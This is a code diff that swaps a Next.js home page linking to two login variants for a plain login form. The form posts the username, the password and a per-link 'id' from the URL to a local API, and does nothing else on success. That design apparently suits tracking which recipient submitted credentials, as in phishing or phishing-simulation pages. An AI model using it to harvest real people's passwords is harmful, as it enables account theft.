@@ -1,25 +1,64 @@
-import Link from "next/link"
+"use client"
+
+import { useState } from "react"
+import { useSearchParams } from "next/navigation"
 
 export default function Home() {
+  const [username, setUsername] = useState("")
+  const [password, setPassword] = useState("")
+  const searchParams = useSearchParams()
+  const uniqueId = searchParams.get("id")
+
+  const handleSubmit = async (e) => {
+    e.preventDefault()
+    const response = await fetch("/api/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username,
+        password,
+        uniqueId,
+      }),
+    })
+
+    if (response.ok) {
+      setUsername("")
+      setPassword("")
+    }
+  }
+
   return (
-    <div className="min-h-screen bg-gradient-to-r from-blue-500 to-purple-600 flex items-center justify-center">
-      <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full">
-        <h1 className="text-3xl font-bold mb-6 text-center text-gray-800">Welcome</h1>
-        <div className="space-y-4">
-          <Link
-            href="/login1"
-            className="block w-full py-2 px-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg text-center transition duration-300"
-          >
-            Login Page 1
-          </Link>
-          <Link
-            href="/login2"
-            className="block w-full py-2 px-4 bg-purple-600 hover:bg-purple-700 text-white font-semibold rounded-lg text-center transition duration-300"
-          >
-            Login Page 2
-          </Link>
+    <div className="p-4">
+      <h1 className="text-4xl mb-8 font-serif">Login</h1>
+      <form onSubmit={handleSubmit} className="space-y-4">
+        <div>
+          <label htmlFor="username" className="block font-serif text-xl mb-1">
+            Username
+          </label>
+          <input
+            type="text"
+            id="username"
+            value={username}
+            onChange={(e) => setUsername(e.target.value)}
+            className="w-full p-2 border border-gray-300 rounded"
+          />
         </div>
-      </div>
+        <div>
+          <label htmlFor="password" className="block font-serif text-xl mb-1">
+            Password
+          </label>
+          <input
+            type="password"
+            id="password"
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+            className="w-full p-2 border border-gray-300 rounded"
+          />
+        </div>
+        <button type="submit" className="px-4 py-2 border border-gray-300 rounded hover:bg-gray-100">
+          Login
+        </button>
+      </form>
     </div>
   )
 }
